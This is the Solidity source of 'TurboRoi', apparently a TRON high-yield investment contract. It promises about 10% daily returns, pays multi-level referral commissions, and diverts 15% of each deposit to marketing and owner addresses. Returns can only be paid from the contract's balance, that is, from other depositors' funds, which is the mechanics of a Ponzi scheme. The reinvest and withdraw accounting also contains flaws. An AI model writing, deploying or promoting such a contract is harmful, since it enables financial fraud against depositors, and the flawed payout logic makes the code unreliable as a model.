//SourceUnit: turboroi.sol

pragma solidity ^0.4.25;

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b);

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;

        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);

        return c;
    }
}

contract TurboRoi {
    using SafeMath for uint256;

    uint256 public totalPlayers;
    uint256 public totalPayout;
    uint256 public totalInvested;
    uint256 private minDeposit = 100000000;
    uint256 private interestRate = 1000000000000;
    uint256 public comDev = 10;
    uint256 public divisorFact = 100;
    uint256 private minuteRate = 1160000; // 10% Diario
    address public marketingAddress;

    address owner;

    struct Player {
        uint256 trxDeposit;
        uint256 time;
        uint256 interestProfit;
        uint256 affRewards;
        uint256 payoutSum;
        uint256 percents;
        address affFrom;
        uint256 aff1sum;
        uint256 aff2sum;
        uint256 aff3sum;
        uint256 aff4sum;
    }

    mapping(address => Player) public players;

    constructor(address _marketingAddr) public {
        owner = msg.sender;
        marketingAddress = _marketingAddr;
    }

    function register(address _addr, address _affAddr) private {
        Player storage player = players[_addr];

        player.affFrom = _affAddr;

        address _affAddr1 = _affAddr;
        address _affAddr2 = players[_affAddr1].affFrom;
        address _affAddr3 = players[_affAddr2].affFrom;

        players[_affAddr1].aff1sum = players[_affAddr1].aff1sum.add(1);
        players[_affAddr2].aff2sum = players[_affAddr2].aff2sum.add(1);
        players[_affAddr3].aff3sum = players[_affAddr3].aff3sum.add(1);
    }

    function deposit(address _affAddr) public payable {
        collect(msg.sender);
        require(msg.value >= minDeposit);
        uint256 depositAmount = msg.value;

        Player storage player = players[msg.sender];

        if (player.time == 0) {
            player.time = now;
            totalPlayers++;
            if (_affAddr != address(0) && players[_affAddr].trxDeposit > 0) {
                register(msg.sender, _affAddr);
            } else {
                register(msg.sender, owner);
            }
        }
        player.trxDeposit = player.trxDeposit.add(depositAmount);

        distributeRef(msg.value, player.affFrom);
        totalInvested = totalInvested.add(depositAmount);
        uint256 devEarn = (depositAmount * comDev) / divisorFact;

        marketingAddress.transfer(devEarn);
        owner.transfer(devEarn / 2);
    }

    function withdraw() public {
        collect(msg.sender);
        require(players[msg.sender].interestProfit > 0);

        players[msg.sender].percents =
            (players[msg.sender].trxDeposit * 200) /
            100;
        if (players[msg.sender].interestProfit < players[msg.sender].percents) {
            uint256 reinven = (players[msg.sender].interestProfit * 250) / 1000;
            reinvest(msg.sender);
            transferPayout(
                msg.sender,
                players[msg.sender].interestProfit - reinven
            );
        }
    }

    function reinvest(address _addr) internal {
        collect(_addr);
        Player storage player = players[_addr];
        uint256 depositAmount = player.interestProfit;
        require(address(this).balance >= depositAmount);
        uint256 reinve = (depositAmount * 250) / 1000;
        player.trxDeposit = player.trxDeposit.add(reinve);
    }

    function collect(address _addr) internal {
        Player storage player = players[_addr];
        uint256 secPassed = now.sub(player.time);
        if (secPassed > 0 && player.time > 0) {
            uint256 collectProfit =
                (player.trxDeposit.mul(secPassed.mul(minuteRate))).div(
                    interestRate
                );

            player.interestProfit = player.interestProfit.add(collectProfit);
            player.time = player.time.add(secPassed);
        }
    }

    function transferPayout(address _receiver, uint256 _amount) internal {
        if (_amount > 0 && _receiver != address(0)) {
            uint256 contractBalance = address(this).balance;
            if (contractBalance > 0) {
                uint256 payout =
                    _amount > contractBalance ? contractBalance : _amount;
                totalPayout = totalPayout.add(payout);

                Player storage player = players[_receiver];
                player.payoutSum = player.payoutSum.add(payout);
                player.interestProfit = player.interestProfit.sub(payout);

                msg.sender.transfer(payout);
            }
        }
    }

    function _calculateDividends(
        uint256 _amount,
        uint256 _dailyInterestRate,
        uint256 _now,
        uint256 _start
    ) private pure returns (uint256) {
        return
            (((_amount * _dailyInterestRate) / 1000) * (_now - _start)) /
            (60 * 60 * 24);
    }

    function distributeRef(uint256 _trx, address _affFrom) private {
        uint256 _allaff = (_trx.mul(10)).div(100);

        address _affAddr1 = _affFrom;
        address _affAddr2 = players[_affAddr1].affFrom;
        address _affAddr3 = players[_affAddr2].affFrom;

        uint256 _affRewards = 0;

        if (_affAddr1 != address(0)) {
            _affRewards = (_trx.mul(5)).div(100);
            players[_affAddr1].affRewards = _affRewards.add(
                players[_affAddr1].affRewards
            );
            _affAddr1.transfer(_affRewards);
        }

        if (_affAddr2 != address(0)) {
            _affRewards = (_trx.mul(2)).div(100);
            players[_affAddr2].affRewards = _affRewards.add(
                players[_affAddr2].affRewards
            );
            _affAddr2.transfer(_affRewards);
        }
        if (_affAddr3 != address(0)) {
            _affRewards = (_trx.mul(1)).div(100);
            players[_affAddr3].affRewards = _affRewards.add(
                players[_affAddr3].affRewards
            );
            _affAddr3.transfer(_affRewards);
        }
    }

    function getProfit(address _addr) public view returns (uint256) {
        address playerAddress = _addr;
        Player storage player = players[playerAddress];
        require(player.time > 0);

        uint256 secPassed = now.sub(player.time);
        if (secPassed > 0) {
            uint256 collectProfit =
                (player.trxDeposit.mul(secPassed.mul(minuteRate))).div(
                    interestRate
                );
        }
        return collectProfit.add(player.interestProfit);
    }
}